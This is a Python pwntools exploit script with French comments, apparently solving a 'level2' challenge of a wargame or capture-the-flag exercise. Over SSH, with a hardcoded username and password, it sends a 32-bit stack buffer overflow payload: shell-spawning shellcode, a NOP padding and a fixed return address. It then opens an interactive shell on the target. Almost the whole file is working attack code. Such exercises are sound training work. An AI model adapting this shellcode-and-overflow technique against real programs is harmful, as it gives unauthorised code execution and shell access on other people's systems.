#!/usr/bin/env python3
from pwn import *
import base64
import os

from pwnlib.adb import shell

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8888  # Port pour SSH
USER = "level2"  # Nom d'utilisateur SSH
PASSWORD = "53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        return process(['./Resources/level2'], env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)
        
        # Fusionner avec nos variables personnalisées
        final_env = merge_env(remote_env_dict, custom_env)
        return shell.process(['/home/user/level2/level2'], env=final_env)

def exploit():
    # Création du shellcode pour spawn un shell
    shellcode = asm(shellcraft.i386.linux.sh())

    print(f"Shellcode length: {len(shellcode)} bytes")



    # Ajout du shellcode dans l'environnement avec un NOP slide
    nop_slide = b"\x90" * (80 - len(shellcode))
    print(f"NOP slide length: {len(nop_slide)} bytes")
    return_addr = p32(0x0804a008)  # Adresse de début du buffer (à ajuster si nécessaire)

    payload =  shellcode + nop_slide +  return_addr

    print(f"Payload length: {len(payload)} bytes")



    conn = get_connection()

    if LOCAL:
        gdb.attach(conn, '''
          break *p
          continue
          ''')
    # Envoi du payload
    conn.sendline(payload)

    try:
        # Tentative d'obtenir un shell interactif
        conn.interactive()
    except:
        log.failure("L'exploit n'a pas fonctionné")

if __name__ == "__main__":
    exploit()
